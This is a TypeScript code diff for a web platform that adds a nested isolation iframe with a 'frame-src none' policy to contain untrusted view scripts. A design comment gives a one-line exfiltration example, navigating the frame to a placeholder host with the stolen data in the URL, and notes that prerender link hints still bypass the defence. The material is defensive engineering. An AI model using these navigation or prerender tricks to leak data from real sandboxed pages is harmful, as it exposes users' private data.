@@ -299,14 +299,15 @@ export const BRIDGE_REFRESH_MESSAGE = 'maskin:bridge:refresh'
 
 // Same posting model as the viewer reporter above: null origin, so targetOrigin
 // is '*' and the host validates event.source against its own iframe instead.
-// The frame only accepts results from window.parent. Unlike VIEWER_REPORTER this
+// The frame lives one frame deeper than the host (see the isolation frame below), so
+// the host is `parent.parent`; the frame only accepts results from it. Unlike VIEWER_REPORTER this
 // does not swallow wheel events: an inline view must let the page scroll.
-const BRIDGE_SCRIPT = `<script>(function(){var n=0,p={};window.maskin={query:function(name){return new Promise(function(res,rej){var id=++n;p[id]={res:res,rej:rej};parent.postMessage({type:'${BRIDGE_QUERY_MESSAGE}',id:id,name:String(name)},'*')})}};window.addEventListener('message',function(e){if(e.source!==parent)return;var d=e.data;if(!d)return;if(d.type==='${BRIDGE_RESULT_MESSAGE}'){var h=p[d.id];if(!h)return;delete p[d.id];if(d.error)h.rej(new Error(d.error));else h.res(d.data)}else if(d.type==='${BRIDGE_REFRESH_MESSAGE}'){window.dispatchEvent(new Event('maskin:refresh'))}})})();</script>`
+const BRIDGE_SCRIPT = `<script>(function(){var n=0,p={};window.maskin={query:function(name){return new Promise(function(res,rej){var id=++n;p[id]={res:res,rej:rej};parent.parent.postMessage({type:'${BRIDGE_QUERY_MESSAGE}',id:id,name:String(name)},'*')})}};window.addEventListener('message',function(e){if(e.source!==parent.parent)return;var d=e.data;if(!d)return;if(d.type==='${BRIDGE_RESULT_MESSAGE}'){var h=p[d.id];if(!h)return;delete p[d.id];if(d.error)h.rej(new Error(d.error));else h.res(d.data)}else if(d.type==='${BRIDGE_REFRESH_MESSAGE}'){window.dispatchEvent(new Event('maskin:refresh'))}})})();</script>`
 
 // Reports the document's content height (not scrollHeight, which can never
 // shrink below the frame's own height) on load, resize and every layout change,
 // so an inline view can size its iframe to fit as data arrives.
-const VIEW_SIZE_REPORTER = `<script>(function(){function s(){try{var d=document.documentElement;parent.postMessage({type:'${VIEWER_DOC_SIZE_MESSAGE}',w:d.scrollWidth,h:Math.ceil(d.getBoundingClientRect().height)},'*')}catch(e){}}if(document.readyState==='complete')s();else window.addEventListener('load',s);window.addEventListener('resize',s);if(window.ResizeObserver)new ResizeObserver(s).observe(document.documentElement)})();</script>`
+const VIEW_SIZE_REPORTER = `<script>(function(){function s(){try{var d=document.documentElement;parent.parent.postMessage({type:'${VIEWER_DOC_SIZE_MESSAGE}',w:d.scrollWidth,h:Math.ceil(d.getBoundingClientRect().height)},'*')}catch(e){}}if(document.readyState==='complete')s();else window.addEventListener('load',s);window.addEventListener('resize',s);if(window.ResizeObserver)new ResizeObserver(s).observe(document.documentElement)})();</script>`
 
 // Inline-view variant of `prepareMiniAppHtml`: same CSP + data-slot bootstrap,
 // plus the size reporter and the bridge. One `injectIntoHtml` call, as above.
@@ -316,6 +317,29 @@ export function prepareBridgedViewHtml(html: string): string {
 		scrubbed,
 		CSP_META + DATA_SLOT_BOOTSTRAP + VIEW_SIZE_REPORTER + BRIDGE_SCRIPT,
 	)
+}
+
+// The isolation frame. A view's script can send what it has read anywhere by
+// navigating its own frame (`location = 'https://x/?d=' + data`); the platform CSP
+// does not cover navigation. A document's `frame-src` is checked against its child
+// frames' navigations, including a child navigating itself, so the view runs in a
+// frame INSIDE a frame whose only policy is `frame-src 'none'`. That outer frame
+// holds no agent code. It carries no other CSP on purpose: a srcdoc frame inherits
+// its embedder's policy, and `img-src data:` etc. must stay the view's own.
+//
+// This is one layer, not a seal. Verified in Chrome only; other browsers are
+// untested. It does not stop resource hints: `<link rel=prerender href=...>` still
+// makes Chrome fetch an address of the view's choosing.
+/** Isolation frame -> host: the view frame finished a load. A second one means it navigated. */
+export const ISOLATION_LOAD_MESSAGE = 'maskin:view:load'
+export const ISOLATION_FRAME_CSP = "frame-src 'none'"
+
+const escapeAttr = (s: string) => s.replace(/&/g, '&amp;').replace(/"/g, '&quot;')
+
+/** The document the host puts in its iframe: it holds the view (from `prepareBridgedViewHtml`) in a frame of its own. */
+export function prepareIsolatedViewHtml(html: string): string {
+	// The load relay is an attribute, not a script, so it is bound before the first load can fire.
+	return `<!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="${ISOLATION_FRAME_CSP}"><style>html,body{margin:0;height:100%}iframe{display:block;border:0;width:100%;height:100%}</style></head><body><iframe sandbox="allow-scripts" onload="parent.postMessage({type:'${ISOLATION_LOAD_MESSAGE}'},'*')" srcdoc="${escapeAttr(prepareBridgedViewHtml(html))}"></iframe></body></html>`
 }
 
 export type ViewSourcesResult =
